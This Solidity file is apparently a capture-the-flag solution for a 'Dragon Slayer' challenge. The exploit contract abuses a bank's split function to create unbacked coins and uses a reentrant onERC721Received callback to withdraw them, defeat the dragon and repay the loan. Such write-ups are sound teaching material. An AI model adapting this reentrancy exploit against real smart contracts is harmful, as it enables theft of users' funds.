// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./dragon_slayer_contracts/Setup.sol";
import "./dragon_slayer_contracts/Knight.sol";
import "./dragon_slayer_contracts/Dragon.sol";
import "./dragon_slayer_contracts/Bank.sol";
import "./dragon_slayer_contracts/GoldCoin.sol";

contract Exploit {
    // Challenge contracts
    Setup public setup;
    Knight public knight;
    Dragon public dragon;
    Bank public bank;
    GoldCoin public goldCoin;

    // Counts the number of times onERC721Received is called
    uint256 hitCount;

    // Amount of gold coins required to solve the challenge
    uint256 constant goldCoinAmount = 2_000_000 ether;

    constructor(Setup _setup) {
        // Initialize challenge contracts
        setup = _setup;
        knight = setup.knight();
        dragon = knight.dragon();
        bank = knight.bank();
        goldCoin = bank.goldCoin();

        // Claim ownership of Knight contract
        setup.claim();
    }

    function exploit() public {
        // Get an empty banknote (id 1)
        uint[] memory bankNoteIDsFrom = new uint[](0);
        bank.merge(bankNoteIDsFrom);

        // Abuse bank.split() to "borrow" 2,000,000 ether
        uint[] memory amounts = new uint[](2);
        amounts[0] = goldCoinAmount;
        bank.split(1, amounts);
    }

    function onERC721Received(address, address, uint256, bytes calldata) public returns (bytes4) {
        // Only perform the exploit on the third onERC721Received call
        if (hitCount == 2) {
            // Withdraw all gold coins from banknote (id 2)
            bank.withdraw(2);

            // Transfer all coins to Knight
            goldCoin.transfer(address(knight), goldCoinAmount);
            
            // Buy items 3 and 4
            knight.buyItem(3);
            knight.buyItem(4);

            // Fight Dragon until its health is 0
            while (dragon.health() > 0) {
                knight.fightDragon();
            }

            // Sell items 3 and 4
            knight.sellItem(3);
            knight.sellItem(4);

            // Deposit gold coins into a new banknote (id 4)
            knight.bankDeposit(goldCoinAmount);

            // Transfer all gold coins back to this contract's banknote (id 1)
            knight.bankTransferPartial(4, goldCoinAmount, 1);
        }
        
        // Increment the counter by 1
        hitCount += 1;

        return this.onERC721Received.selector;
    }

}